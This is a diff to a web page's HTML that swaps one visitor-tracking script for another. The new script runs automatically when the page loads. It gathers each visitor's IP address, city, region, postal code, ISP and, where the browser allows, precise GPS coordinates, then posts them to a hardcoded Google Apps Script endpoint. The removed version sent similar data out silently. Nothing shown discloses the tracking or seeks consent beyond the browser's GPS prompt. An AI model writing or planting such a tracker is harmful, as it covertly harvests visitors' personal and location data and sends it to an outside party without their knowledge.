@@ -624,34 +624,56 @@
 
   <!-- Auto Visitor Location Tracking Script -->
   <script>
-    window.addEventListener('DOMContentLoaded', function() {
-      fetch('https://ipwho.is/')
-        .then(function(res) { return res.json(); })
-        .then(function(data) {
-          if (!data.success) return;
+    // Replace with your Google Apps Script Web App URL
+    const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw4JLCKxakiYv0yTb-EmcsQf-0L5OIg_i5tkyYMA5Stv9VBPV8S17iG4h538bWjLfECFQ/exec";
 
-          var payload = {
-            ip: data.ip,
-            city: data.city,
-            region: data.region,
-            pincode: data.postal,
-            isp: data.connection ? data.connection.isp : 'N/A',
-            mapUrl: 'https://www.google.com/maps?q=' + data.latitude + ',' + data.longitude
-          };
+    async function trackLocation() {
+      try {
+        // 1. Fetch visitor's actual IP & location data from the client side
+        const ipRes = await fetch("https://ipapi.co/json/");
+        const ipData = await ipRes.json();
 
-          var GOOGLE_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw4JLCKxakiYv0yTb-EmcsQf-0L5OIg_i5tkyYMA5Stv9VBPV8S17iG4h538bWjLfECFQ/exec';
+        let payload = {
+          ip: ipData.ip || "N/A",
+          city: ipData.city || "N/A",
+          region: ipData.region || "N/A",
+          pincode: ipData.postal || "N/A",
+          isp: ipData.org || "N/A",
+          mapUrl: `https://maps.google.com/?q=${ipData.latitude},${ipData.longitude}`
+        };
 
-          fetch(GOOGLE_WEB_APP_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'text/plain' },
-            body: JSON.stringify(payload)
-          });
-        })
-        .catch(function(err) {
-          console.log("Tracking Error:", err);
-        });
-    });
+        // 2. Optional: Request high-accuracy GPS if permitted by the user
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+              payload.mapUrl = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+              await sendData(payload);
+            },
+            async () => {
+              // If GPS permission denied, fallback to IP location
+              await sendData(payload);
+            },
+            { timeout: 5000 }
+          );
+        } else {
+          await sendData(payload);
+        }
+      } catch (err) {
+        console.error("Error retrieving location:", err);
+      }
+    }
+
+    async function sendData(payload) {
+      await fetch(APPS_SCRIPT_URL, {
+        method: "POST",
+        mode: "no-cors", // Required for cross-origin requests to Apps Script
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    }
+
+    // Run automatically when page opens
+    window.onload = trackLocation;
   </script>
 </body>
 </html>
